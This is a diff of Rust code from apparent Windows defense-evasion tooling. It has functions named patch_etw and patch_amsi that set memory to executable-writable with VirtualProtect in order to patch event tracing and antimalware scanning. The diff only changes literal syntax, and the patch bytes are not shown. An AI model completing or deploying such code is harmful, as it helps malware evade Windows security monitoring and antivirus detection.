@@ -19,7 +19,7 @@ pub fn patch_etw() -> Result<(), AppError> {
     let hmodule: HINSTANCE = unsafe {
         match LoadLibraryA(lplibfilename) {
             Ok(val) => {
-                if val.0 == 0 as isize {
+                if val.0 == 0_isize {
                     return Err(AppError {
                         description: String::from("LoadLibraryA() returned an invalid handle"),
                     });
@@ -61,7 +61,7 @@ pub fn patch_etw() -> Result<(), AppError> {
     let result = unsafe {
         VirtualProtect(
             proc_address as *const c_void,
-            1 as usize,
+            1_usize,
             PAGE_EXECUTE_READWRITE,
             addr_oldprotect as *mut PAGE_PROTECTION_FLAGS,
         )
@@ -91,7 +91,7 @@ pub fn patch_etw() -> Result<(), AppError> {
     let result = unsafe {
         VirtualProtect(
             proc_address as *const c_void,
-            1 as usize,
+            1_usize,
             PAGE_PROTECTION_FLAGS(oldprotect.into()),
             addr_oldoldprotect as *mut PAGE_PROTECTION_FLAGS,
         )
@@ -119,7 +119,7 @@ pub fn patch_amsi() -> Result<(), AppError> {
     let hmodule: HINSTANCE = unsafe {
         match LoadLibraryA(lplibfilename) {
             Ok(val) => {
-                if val.0 == 0 as isize {
+                if val.0 == 0_isize {
                     return Err(AppError {
                         description: String::from("LoadLibraryA() returned an invalid handle"),
                     });
@@ -161,7 +161,7 @@ pub fn patch_amsi() -> Result<(), AppError> {
     let result = unsafe {
         VirtualProtect(
             proc_address as *const c_void,
-            6 as usize,
+            6_usize,
             PAGE_EXECUTE_READWRITE,
             addr_oldprotect as *mut PAGE_PROTECTION_FLAGS,
         )
@@ -190,7 +190,7 @@ pub fn patch_amsi() -> Result<(), AppError> {
     let result = unsafe {
         VirtualProtect(
             proc_address as *const c_void,
-            6 as usize,
+            6_usize,
             PAGE_PROTECTION_FLAGS(oldprotect.into()),
             addr_oldoldprotect as *mut PAGE_PROTECTION_FLAGS,
         )
